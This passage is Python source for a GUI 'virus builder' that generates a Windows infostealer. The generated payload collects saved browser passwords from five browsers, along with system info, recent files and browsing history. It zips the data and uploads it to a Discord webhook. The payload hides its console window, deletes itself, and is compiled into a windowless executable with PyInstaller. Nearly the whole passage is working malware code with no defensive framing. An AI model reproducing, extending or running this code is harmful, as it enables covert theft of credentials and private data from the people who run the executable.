                if os.path.exists(logins_path):
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        try:
                            data = json.load(f)
                            for login in data.get('logins', []):
                                hostname = login.get('hostname', '')
                                username = login.get('encryptedUsername', '')
                                passwords.append(f"link : {{hostname}} | email : [ENCRYPTED] | password : [ENCRYPTED - Firefox requires specific decryption]")
                        except:
                            pass
                break
    except Exception as e:
        passwords.append(f"Firefox - Error: {{str(e)}}")
    
    return passwords

def get_all_passwords():
    password_file = os.path.join(RESULTS_DIR, "password_manager.txt")
    all_passwords = []
    
    all_passwords.append("=== PASSWORD MANAGER ===")
    all_passwords.append("Format: link : [site] | email : [email/account] | password : [password]\\n")
    
    all_passwords.append("\\n[ CHROME ]" + "="*50)
    chrome_pass = get_chrome_passwords()
    if chrome_pass:
        all_passwords.extend(chrome_pass)
    else:
        all_passwords.append("No passwords found in Chrome")
    
    all_passwords.append("\\n[ EDGE ]" + "="*50)
    edge_pass = get_edge_passwords()
    if edge_pass:
        all_passwords.extend(edge_pass)
    else:
        all_passwords.append("No passwords found in Edge")
    
    all_passwords.append("\\n[ BRAVE ]" + "="*50)
    brave_pass = get_brave_passwords()
    if brave_pass:
        all_passwords.extend(brave_pass)
    else:
        all_passwords.append("No passwords found in Brave")
    
    all_passwords.append("\\n[ OPERA ]" + "="*50)
    opera_pass = get_opera_passwords()
    if opera_pass:
        all_passwords.extend(opera_pass)
    else:
        all_passwords.append("No passwords found in Opera")
    
    all_passwords.append("\\n[ FIREFOX ]" + "="*50)
    firefox_pass = get_firefox_passwords()
    if firefox_pass:
        all_passwords.extend(firefox_pass)
    else:
        all_passwords.append("No passwords found in Firefox")
    
    with open(password_file, 'w', encoding='utf-8') as f:
        f.write("\\n".join(all_passwords))
    
    return password_file

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {{
                'file': (os.path.basename(file_path), f, 'application/octet-stream')
            }}
            response = requests.post(WEBHOOK_URL, files=files, timeout=30)
            return response.status_code == 200 or response.status_code == 204
    except Exception as e:
        print(f"Send error: {{e}}")
        return False

def create_zip_report():
    zip_path = os.path.join(TEMP_DIR, "Complete_Report.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(RESULTS_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, RESULTS_DIR)
                zipf.write(file_path, arcname)
    return zip_path

def main():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        results = {{}}
'''

        if "system_info" in selected_options:
            code += '''
        sys_info = get_system_info()
        sys_file = os.path.join(RESULTS_DIR, "system_info.txt")
        with open(sys_file, 'w', encoding='utf-8') as f:
            f.write(sys_info)
        results['system'] = sys_file
'''
        if "recent_files" in selected_options:
            code += '''
        recent_files = get_recent_files()
        files_file = os.path.join(RESULTS_DIR, "recent_files.txt")
        with open(files_file, 'w', encoding='utf-8') as f:
            f.write(recent_files)
        results['files'] = files_file
'''
        if "browser_history" in selected_options:
            code += '''
        downloads_file = get_browser_downloads()
        if downloads_file:
            results['downloads'] = downloads_file
        
        searches_file = get_browser_search_history()
        if searches_file:
            results['searches'] = searches_file
'''
        if "password_manager" in selected_options:
            code += '''
        password_file = get_all_passwords()
        if password_file:
            results['passwords'] = password_file
'''

        code += '''
        zip_report = create_zip_report()
        
        if os.path.exists(zip_report):
            if send_file(zip_report):
                print("Report sent successfully")
            else:
                print("Failed to send report")
        
        shutil.rmtree(TEMP_DIR, ignore_errors=True)
        
    except Exception as e:
        print(f"Error in main: {{e}}")
'''

        if auto_delete:
            code += '''
    try:
        time.sleep(2)
        os.remove(sys.argv[0])
    except:
        pass
'''

        code += '''
if __name__ == "__main__":
    main()
'''
        return code
    
    def convert_to_exe(self, py_file, filename, icon_path):
        self.log("\n🔄 Converting to executable...")
        
        try:
            import PyInstaller.__main__
            
            hidden_imports = [
                '--hidden-import=win32crypt',
                '--hidden-import=win32api',
                '--hidden-import=win32security'
            ]
            
            args = [
                py_file,
                '--onefile',
                '--noconsole',
                '--name', filename,
                '--distpath', self.output_path,
                '--workpath', os.path.join(self.output_path, 'build'),
                '--specpath', self.output_path,
                '--clean'
            ] + hidden_imports
            
            if icon_path and os.path.exists(icon_path):
                args.extend(['--icon', icon_path])
                
            self.log("⚙️ Compiling...")
            PyInstaller.__main__.run(args)
            
            exe_path = os.path.join(self.output_path, f"{filename}.exe")
            if os.path.exists(exe_path):
                self.log(f"✅ Executable generated: {exe_path}", "success")
                
                for f in os.listdir(self.output_path):
                    if f.endswith('.spec'):
                        try:
                            os.remove(os.path.join(self.output_path, f))
                        except:
                            pass
                
                build_dir = os.path.join(self.output_path, 'build')
                if os.path.exists(build_dir):
                    try:
                        shutil.rmtree(build_dir)
                    except:
                        pass
                
                if messagebox.askyesno("Success", f"File generated!\n\nLocation: {exe_path}\n\nThis collector will:\n• Collect system information\n• List recent files\n• Retrieve download history\n• Retrieve search history\n• Retrieve saved passwords (Chrome, Edge, Brave, Opera)\n• Create a summary ZIP\n• Send the ZIP to Discord\n\nOpen folder?"):
                    os.startfile(self.output_path)
            else:
                self.log("❌ Generation error", "error")
                
        except ImportError as e:
            self.log(f"❌ Missing module: {str(e)}", "error")
            messagebox.showerror("Error", 
                                "Required modules not installed.\n\nInstall them with:\n"
                                "pip install pyinstaller pywin32")
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "error")
            messagebox.showerror("Error", f"Error: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = VirusBuilderGUI(root)
    root.mainloop()